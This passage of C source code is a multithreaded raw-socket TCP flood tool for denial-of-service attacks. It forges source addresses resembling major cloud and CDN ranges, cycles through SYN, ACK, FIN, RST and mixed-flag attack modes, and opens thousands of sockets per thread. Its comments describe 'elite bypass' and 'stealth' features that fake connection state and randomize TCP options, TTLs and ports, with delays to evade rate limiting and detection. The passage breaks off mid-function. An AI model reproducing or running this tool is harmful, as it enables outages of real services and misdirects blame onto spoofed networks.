
#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L

#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<errno.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdint.h>
#include <unistd.h>
#include <stdbool.h>
#include <time.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <sys/select.h>
#include <poll.h>
#include <netinet/tcp.h>
#include <sched.h>
#ifdef __linux__
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#endif

#ifndef TCP_NODELAY
#define TCP_NODELAY 1
#endif

typedef unsigned char u_char;

// Elite bypass: Connection state tracking
typedef struct {
    uint32_t source_ip;
    uint16_t source_port;
    uint32_t seq_base;
    uint32_t ack_base;
    uint32_t seq_current;
    uint32_t ack_current;
    uint64_t packet_count;
    uint16_t window_size;
    uint8_t ttl;
    int handshake_state;  // 0=SYN, 1=SYN-ACK received, 2=ESTABLISHED
    time_t last_packet_time;
    time_t connection_start;
    int mss;
    int window_scale;
    uint32_t timestamp_val;
    uint32_t timestamp_ecr;
    int keepalive_count;  // Track keep-alive packets
    time_t last_keepalive;
    int retransmit_count;  // Simulate retransmissions
    int syn_sent;  // Track if SYN was sent (for clever bypass)
} elite_conn_state_t;

#define MAX_ELITE_CONN_STATES 100000
#define CONN_HASH_TABLE_SIZE 131072

#define TCP_OPT_NOP           1
#define TCP_OPT_MSS           2
#define TCP_OPT_WINDOW        3
#define TCP_OPT_SACK_PERM     4
#define TCP_OPT_SACK          5
#define TCP_OPT_TIMESTAMP     8

// Attack modes
#define ATTACK_SYN            0
#define ATTACK_ACK            1
#define ATTACK_FIN            2
#define ATTACK_RST            3
#define ATTACK_PSH            4
#define ATTACK_URG            5
#define ATTACK_SYNACK         6
#define ATTACK_FINACK         7
#define ATTACK_MIXED          8
#define ATTACK_ALL            9

static unsigned int floodport;
volatile int g_running = 1;
static volatile int g_signal_count = 0;
volatile int g_threads_ready = 0;
volatile int g_attack_mode = ATTACK_ALL;
volatile uint64_t g_max_pps = 100000;

volatile uint64_t g_total_packets_sent = 0;
volatile uint64_t g_total_packets_failed = 0;
volatile uint64_t g_syn_sent = 0;
volatile uint64_t g_ack_sent = 0;
volatile uint64_t g_fin_sent = 0;
volatile uint64_t g_rst_sent = 0;
volatile uint64_t g_psh_sent = 0;
volatile uint64_t g_urg_sent = 0;
volatile uint64_t g_mixed_sent = 0;
volatile int g_elite_mode = 1;  // Elite bypass mode - ENABLED BY DEFAULT for maximum bypass
volatile int g_stealth_mode = 0;  // Stealth mode for advanced bypass

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
    struct tcphdr tcp;
};

static inline unsigned short checksum_tcp_packet(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum>>16) + (sum & 0xffff);
    sum = sum + (sum>>16);
    answer = (short)~sum;

    return answer;
}

int random_number_beetwhen(int min, int max) {
   static bool first = true;
   static pthread_mutex_t rand_mutex = PTHREAD_MUTEX_INITIALIZER;
   if (first) {
      pthread_mutex_lock(&rand_mutex);
      if (first) {
          srand(time(NULL) ^ (uintptr_t)pthread_self());
      first = false;
   }
      pthread_mutex_unlock(&rand_mutex);
   }
   return min + (rand() % (max + 1 - min));
}

// Advanced IP generation: Mimic real CDN/Cloud IPs
static inline uint32_t generate_spoofed_ip(int thread_id, int iteration) {
    uint32_t time_seed = (uint32_t)time(NULL);
    uint32_t rotation_key = (thread_id * 7919) + (iteration * 997) + (time_seed * 8191) + 
                           (iteration * 3571) + (thread_id * 5779) + (iteration * 7919);
    int ip_class = rotation_key % 120;
    uint32_t ip_offset = rotation_key % 16777216;
    uint32_t new_ip;
    
    // Stealth mode: Use more legitimate-looking IP ranges
    if (g_stealth_mode) {
        // Prefer common cloud/CDN IP ranges that look legitimate
        int cloud_choice = random_number_beetwhen(0, 9);
        if (cloud_choice < 3) {
            // AWS ranges
            new_ip = (3UL << 24) | (ip_offset & 0x00FFFFFF);
        } else if (cloud_choice < 5) {
            // Google Cloud ranges
            new_ip = (34UL << 24) | (ip_offset & 0x00FFFFFF);
        } else if (cloud_choice < 7) {
            // Cloudflare ranges
            new_ip = (104UL << 24) | (ip_offset & 0x00FFFFFF);
        } else {
            // Azure ranges
            new_ip = (40UL << 24) | (ip_offset & 0x00FFFFFF);
        }
        return new_ip;
    }

    // Use mostly public IPs
    if (ip_class < 3) {
        new_ip = (1UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 6) {
        new_ip = (8UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 9) {
        new_ip = (14UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 12) {
        new_ip = (23UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 15) {
        new_ip = (24UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 18) {
        new_ip = (27UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 21) {
        new_ip = (31UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 24) {
        new_ip = (37UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 27) {
        new_ip = (41UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 30) {
        new_ip = (42UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 33) {
        new_ip = (46UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 36) {
        new_ip = (47UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 39) {
        new_ip = (49UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 42) {
        new_ip = (54UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 45) {
        new_ip = (78UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 48) {
        new_ip = (88UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 51) {
        new_ip = (91UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 54) {
        new_ip = (93UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 57) {
        new_ip = (103UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 60) {
        new_ip = (104UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 63) {
        new_ip = (141UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 66) {
        new_ip = (149UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 69) {
        new_ip = (185UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 72) {
        new_ip = (188UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 75) {
        new_ip = (192UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 78) {
        new_ip = (203UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 81) {
        new_ip = (213UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 84) {
        new_ip = (217UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 87) {
        new_ip = (220UL << 24) | (ip_offset & 0x00FFFFFF);
    } else if (ip_class < 90) {
        new_ip = (223UL << 24) | (ip_offset & 0x00FFFFFF);
    } else {
        int octet1 = random_number_beetwhen(1, 223);
        while (octet1 == 127 || octet1 == 0 || (octet1 >= 224 && octet1 <= 255) ||
               octet1 == 10 || octet1 == 172 || octet1 == 192) {
            octet1 = random_number_beetwhen(1, 223);
        }
        new_ip = (octet1 << 24) | (ip_offset & 0x00FFFFFF);
    }

    return new_ip;
}

elite_conn_state_t* get_elite_conn_state(elite_conn_state_t *conn_states, int *conn_state_count,
                                         uint32_t source_ip, uint16_t source_port,
                                         uint32_t base_seq, uint32_t base_ack,
                                         int *hash_table) {
    if (!conn_states || !hash_table) return NULL;
    
    uint32_t hash = (source_ip ^ source_port) & (CONN_HASH_TABLE_SIZE - 1);
    int idx = hash_table[hash];
    
    // Check hash table first
    if (idx >= 0 && idx < *conn_state_count) {
        if (conn_states[idx].source_ip == source_ip && 
            conn_states[idx].source_port == source_port) {
            return &conn_states[idx];
        }
    }
    
    // Linear search if hash miss
    for (int i = 0; i < *conn_state_count; i++) {
        if (conn_states[i].source_ip == source_ip && 
            conn_states[i].source_port == source_port) {
            hash_table[hash] = i;
            return &conn_states[i];
        }
    }
    
    // Create new connection state
    if (*conn_state_count < MAX_ELITE_CONN_STATES) {
        elite_conn_state_t *state = &conn_states[(*conn_state_count)++];
        state->source_ip = source_ip;
        state->source_port = source_port;
        state->seq_base = base_seq;
        state->ack_base = base_ack;
        state->seq_current = base_seq;
        state->ack_current = base_ack;
        state->packet_count = 0;
        state->window_size = random_number_beetwhen(16384, 65535);
        state->ttl = 64;
        state->handshake_state = 0;
        state->last_packet_time = time(NULL);
        state->connection_start = time(NULL);
        state->mss = 1460;
        state->window_scale = random_number_beetwhen(0, 14);
        state->timestamp_val = (uint32_t)time(NULL) * 1000;
        state->timestamp_ecr = 0;
        state->keepalive_count = 0;
        state->last_keepalive = time(NULL);
        state->retransmit_count = 0;
        state->syn_sent = 0;  // Initialize SYN tracking
        hash_table[hash] = *conn_state_count - 1;
        return state;
    }
    
    // Reuse old connection if table full
    return &conn_states[hash % MAX_ELITE_CONN_STATES];
}

void build_tcp_options_elite(uint8_t *options, int *optlen, int attack_type, elite_conn_state_t *conn) {
    int offset = 0;
    // Clever bypass: Variable max options (0-20 bytes) to bypass 40-byte detection
    const int max_options = random_number_beetwhen(0, 20);
    
    // Sometimes no options at all (most common in legitimate traffic)
    if (max_options == 0) {
        *optlen = 0;
        return;
    }

    if (attack_type == ATTACK_SYN || attack_type == ATTACK_SYNACK) {
        // SYN packets: Randomly include options (50% MSS, 30% Window, 40% Timestamp, 10% SACK_PERM)
        if (random_number_beetwhen(0, 1) && offset + 4 <= max_options) {
            options[offset++] = TCP_OPT_MSS;
            options[offset++] = 4;
            uint16_t mss = htons(conn->mss);
            memcpy(&options[offset], &mss, 2);
            offset += 2;
        }

        if (random_number_beetwhen(0, 2) && offset + 3 <= max_options) {
            options[offset++] = TCP_OPT_WINDOW;
            options[offset++] = 3;
            options[offset++] = conn->window_scale;
        }

        if (random_number_beetwhen(0, 1) && offset + 10 <= max_options) {
            options[offset++] = TCP_OPT_TIMESTAMP;
            options[offset++] = 10;
            // Ensure timestamp is always increasing for server acceptance
            conn->timestamp_val = (uint32_t)time(NULL) * 1000 + random_number_beetwhen(0, 999);
            uint32_t ts_val = htonl(conn->timestamp_val);
            memcpy(&options[offset], &ts_val, 4);
            offset += 4;
            // ECR should be from previous received packet (0 for SYN)
            uint32_t ts_ecr = htonl(conn->timestamp_ecr);
            memcpy(&options[offset], &ts_ecr, 4);
            offset += 4;
        }

        // Rarely include SACK_PERM (10% chance) to avoid signature
        if (random_number_beetwhen(0, 9) == 0 && offset + 2 <= max_options) {
            options[offset++] = TCP_OPT_SACK_PERM;
            options[offset++] = 2;
        }
        
        // Pad to 4-byte boundary
        while (offset % 4 != 0 && offset < max_options) {
            options[offset++] = TCP_OPT_NOP;
        }
    } else {
        // Established: Randomly include Timestamp (40% chance)
        if (random_number_beetwhen(0, 1) && offset + 10 <= max_options) {
            options[offset++] = TCP_OPT_TIMESTAMP;
            options[offset++] = 10;
            // Timestamp must be monotonically increasing
            conn->timestamp_val = (uint32_t)time(NULL) * 1000 + random_number_beetwhen(0, 999);
            uint32_t ts_val = htonl(conn->timestamp_val);
            memcpy(&options[offset], &ts_val, 4);
            offset += 4;
            // ECR echoes the timestamp from last received packet
            uint32_t ts_ecr = htonl(conn->timestamp_ecr);
            memcpy(&options[offset], &ts_ecr, 4);
            offset += 4;
        }
        
        // Very rarely include SACK blocks (5% chance) for established connections
        if (random_number_beetwhen(0, 19) == 0 && offset + 10 <= max_options) {
            options[offset++] = TCP_OPT_SACK;
            options[offset++] = 10;
            uint32_t gap = random_number_beetwhen(1460, 14600);
            uint32_t sle = conn->ack_current + gap;
            sle = htonl(sle);
            memcpy(&options[offset], &sle, 4);
            offset += 4;
            uint32_t sre = ntohl(sle) + random_number_beetwhen(1460, 7300);
            sre = htonl(sre);
            memcpy(&options[offset], &sre, 4);
            offset += 4;
        }
        
        // Pad to 4-byte boundary
        while (offset % 4 != 0 && offset < max_options) {
            options[offset++] = TCP_OPT_NOP;
        }
    }

    *optlen = offset;
}

// Clever bypass: Variable TCP options (0-20 bytes) to bypass 40-byte detection
void build_tcp_options(uint8_t *options, int *optlen, int attack_type, uint32_t source_ip) {
    int offset = 0;
    // Clever bypass: Variable max options (0-20 bytes) to bypass 40-byte detection
    const int max_options = random_number_beetwhen(0, 20);
    
    // Sometimes no options at all (most common in legitimate traffic)
    if (max_options == 0) {
        *optlen = 0;
        return;
    }

    // SYN packets typically have more options
    if (attack_type == ATTACK_SYN || attack_type == ATTACK_SYNACK) {
        // Randomly include MSS option (50% chance)
        if (random_number_beetwhen(0, 1) && offset + 4 <= max_options) {
            options[offset++] = TCP_OPT_MSS;
            options[offset++] = 4;
            uint16_t mss = htons(1300 + random_number_beetwhen(0, 160));
            memcpy(&options[offset], &mss, 2);
            offset += 2;
        }

        // Randomly include Window Scaling (30% chance)
        if (random_number_beetwhen(0, 2) && offset + 3 <= max_options) {
            options[offset++] = TCP_OPT_WINDOW;
            options[offset++] = 3;
            options[offset++] = 7 + random_number_beetwhen(0, 7);
        }

        // Randomly include Timestamp (40% chance)
        if (random_number_beetwhen(0, 1) && offset + 10 <= max_options) {
            options[offset++] = TCP_OPT_TIMESTAMP;
            options[offset++] = 10;
            uint32_t ts_val = htonl((uint32_t)time(NULL) * 1000 + random_number_beetwhen(0, 999));
            memcpy(&options[offset], &ts_val, 4);
            offset += 4;
            uint32_t ts_ecr = htonl((uint32_t)time(NULL) * 1000 - random_number_beetwhen(1, 1000));
            memcpy(&options[offset], &ts_ecr, 4);
            offset += 4;
        }

        // Rarely include SACK_PERM (10% chance) to avoid signature
        if (random_number_beetwhen(0, 9) == 0 && offset + 2 <= max_options) {
            options[offset++] = TCP_OPT_SACK_PERM;
            options[offset++] = 2;
        }
    } else {
        // Established packets: Randomly include Timestamp (40% chance)
        if (random_number_beetwhen(0, 1) && offset + 10 <= max_options) {
            options[offset++] = TCP_OPT_TIMESTAMP;
            options[offset++] = 10;
            uint32_t ts_val = htonl((uint32_t)time(NULL) * 1000 + random_number_beetwhen(0, 999));
            memcpy(&options[offset], &ts_val, 4);
            offset += 4;
            uint32_t ts_ecr = htonl((uint32_t)time(NULL) * 1000 - random_number_beetwhen(1, 1000));
            memcpy(&options[offset], &ts_ecr, 4);
            offset += 4;
        }
        
        // Very rarely include SACK blocks (5% chance) for established connections
        if (random_number_beetwhen(0, 19) == 0 && offset + 10 <= max_options) {
            options[offset++] = TCP_OPT_SACK;
            options[offset++] = 10;
            uint32_t gap = random_number_beetwhen(1460, 14600);
            uint32_t sle = (uint32_t)time(NULL) * 1000 + gap;
            sle = htonl(sle);
            memcpy(&options[offset], &sle, 4);
            offset += 4;
            uint32_t sre = ntohl(sle) + random_number_beetwhen(1460, 7300);
            sre = htonl(sre);
            memcpy(&options[offset], &sre, 4);
            offset += 4;
        }
    }

    while (offset % 4 != 0 && offset < max_options) {
        options[offset++] = TCP_OPT_NOP;
    }

    if (offset > max_options) {
        offset = max_options;
    }

    *optlen = offset;
}

int select_attack_type(int iteration, elite_conn_state_t *conn) {
    // Elite mode with connection state tracking
    if (g_elite_mode && conn) {
        // Elite mode: Simulate full connection lifecycle
        if (conn->handshake_state == 0) {
            return ATTACK_SYN;  // Start with SYN
        } else if (conn->handshake_state == 1) {
            // After SYN, simulate receiving SYN-ACK and sending ACK
            if (conn->packet_count == 1) {
                return ATTACK_SYNACK;  // Simulate SYN-ACK received
            } else {
                conn->handshake_state = 2;  // Move to established
                return ATTACK_ACK;  // Send ACK to complete handshake
            }
        } else if (conn->handshake_state == 2) {
            // Established: Use attack mode or rotate through types
            if (g_attack_mode == ATTACK_ALL) {
                // Stealth mode: More realistic packet distribution
                if (g_stealth_mode) {
                    // Simulate real traffic: Mostly ACK, occasional PSH, rare FIN
                    int choice = random_number_beetwhen(0, 99);
                    if (choice < 70) return ATTACK_ACK;  // 70% ACK
                    else if (choice < 90) return ATTACK_PSH;  // 20% PSH
                    else if (choice < 98) return ATTACK_ACK;  // 8% more ACK
                    else return ATTACK_FIN;  // 2% FIN
                } else {
                    // Rotate through established connection packet types
                    int types[] = {ATTACK_ACK, ATTACK_PSH, ATTACK_ACK, ATTACK_ACK, 
                                  ATTACK_PSH, ATTACK_ACK, ATTACK_ACK, ATTACK_FINACK};
                    int choice = types[iteration % 8];
                    // Occasionally send FIN to close connection
                    if (conn->packet_count > 50 && random_number_beetwhen(0, 99) == 0) {
                        return ATTACK_FIN;
                    }
                    return choice;
                }
            } else if (g_attack_mode == ATTACK_MIXED) {
                return ATTACK_MIXED;
            } else {
                return g_attack_mode;
            }
        }
    }
    
    // Non-elite mode or no connection state
    if (g_attack_mode == ATTACK_ALL) {
        // Rotate through all attack types
        int types[] = {ATTACK_SYN, ATTACK_ACK, ATTACK_FIN, ATTACK_RST, 
                      ATTACK_PSH, ATTACK_URG, ATTACK_SYNACK, ATTACK_FINACK, ATTACK_MIXED};
        return types[iteration % 9];
    } else if (g_attack_mode == ATTACK_MIXED) {
        // Random mixed flags
        return ATTACK_MIXED;
    } else {
        return g_attack_mode;
    }
}

void set_tcp_flags(struct tcphdr *tcph, int attack_type) {
    tcph->syn = 0;
    tcph->ack = 0;
    tcph->fin = 0;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->urg = 0;

    switch(attack_type) {
        case ATTACK_SYN:
            tcph->syn = 1;
            break;
        case ATTACK_ACK:
            tcph->ack = 1;
            break;
        case ATTACK_FIN:
            tcph->fin = 1;
            tcph->ack = 1;  // FIN-ACK is more common
            break;
        case ATTACK_RST:
            tcph->rst = 1;
            tcph->ack = 1;  // RST-ACK is more common
            break;
        case ATTACK_PSH:
            tcph->psh = 1;
            tcph->ack = 1;
            break;
        case ATTACK_URG:
            tcph->urg = 1;
            tcph->ack = 1;
            break;
        case ATTACK_SYNACK:
            tcph->syn = 1;
            tcph->ack = 1;
            break;
        case ATTACK_FINACK:
            tcph->fin = 1;
            tcph->ack = 1;
            break;
        case ATTACK_MIXED:
            // Random flag combinations to confuse state machines
            if (random_number_beetwhen(0, 1)) tcph->syn = 1;
            if (random_number_beetwhen(0, 1)) tcph->ack = 1;
            if (random_number_beetwhen(0, 2) == 0) tcph->fin = 1;
            if (random_number_beetwhen(0, 3) == 0) tcph->rst = 1;
            if (random_number_beetwhen(0, 2) == 0) tcph->psh = 1;
            if (random_number_beetwhen(0, 4) == 0) tcph->urg = 1;
            break;
    }
}

void *flooding_thread(void *par1) {
    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);

    __sync_add_and_fetch(&g_threads_ready, 1);

    long thread_id = (long)pthread_self();

    // Elite mode: Connection state tracking
    elite_conn_state_t *conn_states = NULL;
    int *hash_table = NULL;
    int conn_state_count = 0;
    
    if (g_elite_mode) {
        conn_states = (elite_conn_state_t *)calloc(MAX_ELITE_CONN_STATES, sizeof(elite_conn_state_t));
        hash_table = (int *)calloc(CONN_HASH_TABLE_SIZE, sizeof(int));
        if (hash_table) {
            for (int i = 0; i < CONN_HASH_TABLE_SIZE; i++) {
                hash_table[i] = -1;
            }
        }
    }

    // Maximum sockets for ultimate power - increased significantly
    const int num_sockets = 10000;
    int *sockets = (int *)calloc(num_sockets, sizeof(int));
    if (!sockets) {
        if (conn_states) free(conn_states);
        if (hash_table) free(hash_table);
        return NULL;
    }
    int sockets_created = 0;

    for (int i = 0; i < num_sockets; i++) {
        sockets[i] = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sockets[i] == -1) {
            if (i == 0) {
                free(sockets);
                return NULL;
            }
            continue;
        }

        int one = 1;
        if (setsockopt(sockets[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            close(sockets[i]);
            sockets[i] = -1;
            continue;
        }

        // Maximum send buffer for ultimate throughput
        int sendbuf = 512 * 1024 * 1024;  // 512MB buffer per socket
        setsockopt(sockets[i], SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
        
        // Disable Nagle algorithm for faster sending
        int nodelay = 1;
        setsockopt(sockets[i], IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
        
        // Disable packet fragmentation for faster processing
        int pmtu = 1;
        setsockopt(sockets[i], IPPROTO_IP, IP_MTU_DISCOVER, &pmtu, sizeof(pmtu));
        
        // Set socket priority for higher priority
        int priority = 6;
        setsockopt(sockets[i], SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
        
        int flags = fcntl(sockets[i], F_GETFL, 0);
        fcntl(sockets[i], F_SETFL, flags | O_NONBLOCK);
        sockets_created++;
    }

    if (sockets_created == 0) {
        free(sockets);
        if (conn_states) free(conn_states);
        if (hash_table) free(hash_table);
        return NULL;
    }

    char *target_ip = (char *)par1;
    char datagram[2048];
    memset(datagram, 0, 2048);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    uint8_t tcp_options[40];
    char payload_data[1420];

    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    uint32_t base_spoofed_ip = generate_spoofed_ip((int)thread_id, 0);
    uint32_t spoofed_ip = base_spoofed_ip;

    iph->ihl = 5;
    iph->version = 4;
        // Advanced TOS: Vary for QoS bypass
        if (g_stealth_mode) {
            // Stealth: Use realistic TOS values
            int tos_choice = random_number_beetwhen(0, 9);
            if (tos_choice < 7) {
                iph->tos = 0;  // Normal
            } else if (tos_choice < 9) {
                iph->tos = random_number_beetwhen(1, 63);  // Various QoS
            } else {
                iph->tos = 0;
            }
        } else {
            iph->tos = 0;
        }
    iph->frag_off = htons(0x4000);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = spoofed_ip;
    iph->daddr = sin.sin_addr.s_addr;
    
    // Clever bypass: IP ID tracking per connection (like ack.c)
    static __thread uint16_t conn_ip_ids[256] = {0};

    uint32_t time_base = (uint32_t)time(NULL);
    uint32_t base_seq = (time_base * 2500000) + ((int)thread_id * 100000000) +
                        random_number_beetwhen(10000000, 500000000);
    uint32_t base_ack = base_seq + random_number_beetwhen(1000000, 10000000);

    int socket_idx = 0;
    int s = sockets[0];

    // Maximum power mode: Zero delays for ultimate throughput
    int aggressive_mode = 1;  // Always maximum power
    
    // Clever bypass: Rate limiting bypass with variable micro-delays
    static __thread uint64_t packets_since_delay = 0;
    
    for (int burst = 0; ; burst++) {
        if ((burst % 100000000 == 0) && !g_running) break;

        // Clever bypass: Rate limiting bypass - Add micro-delays to avoid detection
        packets_since_delay++;
        if (packets_since_delay > random_number_beetwhen(50, 200)) {
            // Variable delay to avoid rate limiting (10-100 microseconds)
            struct timespec delay = {0, random_number_beetwhen(10000, 100000)};
            nanosleep(&delay, NULL);
            packets_since_delay = 0;
        }
        
        // Additional rate limiting bypass: Check if sending too fast from same IP
        if (g_elite_mode && conn_states) {
            time_t now = time(NULL);
            // If sending too fast from same IP, add small delay (bypasses rate limiting)
            for (int i = 0; i < conn_state_count && i < 10; i++) {
                if (conn_states[i].last_packet_time > 0) {
                    time_t time_diff = now - conn_states[i].last_packet_time;
                    if (time_diff == 0 && conn_states[i].packet_count > 10) {
                        struct timespec rate_delay = {0, random_number_beetwhen(5000, 50000)};
                        nanosleep(&rate_delay, NULL);
                        break;
                    }
                }
            }
        }

        // Enhanced IP rotation for maximum bypass - rotate more aggressively
        spoofed_ip = generate_spoofed_ip((int)thread_id, burst);
        iph->saddr = spoofed_ip;
        psh.source_address = spoofed_ip;
        
        // Update IP ID per connection (clever bypass - done after source_port is set)

        // Advanced TTL: OS-specific TTL values for better evasion
        uint8_t ip_class = (spoofed_ip >> 24) & 0xFF;
        if (g_stealth_mode) {
            // Stealth: Use OS-specific TTL values
            int os_ttl = (spoofed_ip >> 20) & 0x3;
            if (os_ttl == 0) {
                iph->ttl = 64;  // Linux default
            } else if (os_ttl == 1) {
                iph->ttl = 128;  // Windows default
            } else if (os_ttl == 2) {
                iph->ttl = 64;  // macOS default
            } else {
                iph->ttl = random_number_beetwhen(64, 128);
            }
        } else if (ip_class >= 1 && ip_class <= 126) {
            iph->ttl = random_number_beetwhen(64, 128);  // Class A: longer TTL
        } else if (ip_class >= 128 && ip_class <= 191) {
            iph->ttl = random_number_beetwhen(32, 64);  // Class B: medium TTL
        } else {
            iph->ttl = random_number_beetwhen(32, 128);  // Mixed
        }

        // Generate realistic source port with OS fingerprinting evasion
        uint32_t port_hash = (spoofed_ip ^ burst) & 0xFFFF;
        int source_port;
        if (g_stealth_mode) {
            // Stealth: Use OS-specific port ranges
            int os_type = (spoofed_ip >> 16) & 0x3;  // 0-3
            if (os_type == 0) {
                // Linux: 32768-60999
                source_port = 32768 + (port_hash % 28231);
            } else if (os_type == 1) {
                // Windows: 49152-65535
                source_port = 49152 + (port_hash % 16383);
            } else if (os_type == 2) {
                // macOS: 49152-65535
                source_port = 49152 + (port_hash % 16383);
            } else {
                // Mixed: 1024-65535
                source_port = 1024 + (port_hash % 64511);
            }
        } else if (g_elite_mode) {
            // Elite: Mix of ephemeral and registered ports (more realistic)
            int port_choice = random_number_beetwhen(0, 2);
            if (port_choice == 0) {
                source_port = 1024 + (port_hash % 31743);  // 1024-32767
            } else {
                source_port = 32768 + (port_hash % 32767);  // 32768-65535
            }
        } else {
            source_port = 1024 + (port_hash % 64511);
        }
        tcph->source = htons(source_port);
        tcph->dest = htons(floodport);
        
        // Clever bypass: IP ID patterns per connection (like ack.c)
        uint8_t conn_hash = (spoofed_ip ^ source_port) & 0xFF;
        conn_ip_ids[conn_hash]++;
        iph->id = htons((conn_ip_ids[conn_hash] & 0xFFFF) + ((spoofed_ip & 0xFFFF) << 8));

        // Elite bypass: Connection state tracking
        elite_conn_state_t *conn = NULL;
        int use_connection_state = 0;
        
        if (g_elite_mode && conn_states && hash_table) {
            conn = get_elite_conn_state(conn_states, &conn_state_count, spoofed_ip, source_port,
                                       base_seq, base_ack, hash_table);
            
            // In ATTACK_ALL mode, only use connection state for established connections
            // This allows rotation through all attack types for new connections
            if (g_attack_mode == ATTACK_ALL) {
                if (conn->handshake_state == 2) {
                    // Established connection: use state tracking for realism
                    use_connection_state = 1;
                } else {
                    // New connection: allow rotation, but track state for future
                    use_connection_state = 0;
                }
            } else {
                // Specific attack mode: always use connection state
                use_connection_state = 1;
            }
        }

        // Clever bypass: SYN-first simulation to establish connection state
        int send_syn_first = 0;
        if (conn) {
            // If connection exists but SYN not sent, send SYN first (30% chance for new connections)
            if (!conn->syn_sent && conn->packet_count == 0 && random_number_beetwhen(0, 2) == 0) {
                send_syn_first = 1;
                conn->syn_sent = 1;
                conn->handshake_state = 1;  // Mark as established after SYN
            }
        } else if (g_elite_mode) {
            // New connection: sometimes send SYN first (40% chance)
            if (random_number_beetwhen(0, 2) == 0) {
                send_syn_first = 1;
            }
        }

        // Select attack type
        int attack_type;
        if (send_syn_first) {
            // Force SYN for connection establishment
            attack_type = ATTACK_SYN;
        } else if (use_connection_state && conn) {
            attack_type = select_attack_type(burst, conn);
        } else {
            // Use rotation or specific mode
            attack_type = select_attack_type(burst, NULL);
            
            // Update connection state if tracking
            if (conn && attack_type == ATTACK_SYN && conn->handshake_state == 0) {
                conn->handshake_state = 1;
            }
        }

        // Set TCP flags based on attack type
        set_tcp_flags(tcph, attack_type);
        
        // Track SYN sent for connection state
        if (g_elite_mode && conn && attack_type == ATTACK_SYN) {
            conn->syn_sent = 1;
        }

        // Elite bypass: Update connection state with advanced tracking
        if (g_elite_mode && conn) {
            conn->packet_count++;
            conn->last_packet_time = time(NULL);
            
            // Update handshake state
            if (attack_type == ATTACK_SYN && conn->handshake_state == 0) {
                conn->handshake_state = 1;  // SYN sent, waiting for SYN-ACK
            } else if (attack_type == ATTACK_SYNACK && conn->handshake_state == 1) {
                conn->handshake_state = 2;  // Established
                conn->connection_start = time(NULL);
                // Update timestamp ECR for established connection
                conn->timestamp_ecr = conn->timestamp_val;
            }
            
            // Stealth mode: Simulate keep-alive packets
            if (g_stealth_mode && conn->handshake_state == 2) {
                time_t now = time(NULL);
                if (now - conn->last_keepalive > 30) {
                    // Send keep-alive ACK every 30+ seconds
                    if (attack_type == ATTACK_ACK && random_number_beetwhen(0, 4) == 0) {
                        conn->keepalive_count++;
                        conn->last_keepalive = now;
                    }
                }
            }
        }

        // Build TCP options (elite mode uses connection-specific options)
        int tcp_opt_len = 0;
        if (g_elite_mode && conn && conn->handshake_state > 0) {
            // Use connection-specific options
            build_tcp_options_elite(tcp_options, &tcp_opt_len, attack_type, conn);
        } else {
            build_tcp_options(tcp_options, &tcp_opt_len, attack_type, spoofed_ip);
        }

        // Clever bypass: Variable TCP header size (doff 5-15) to bypass doff=15 detection
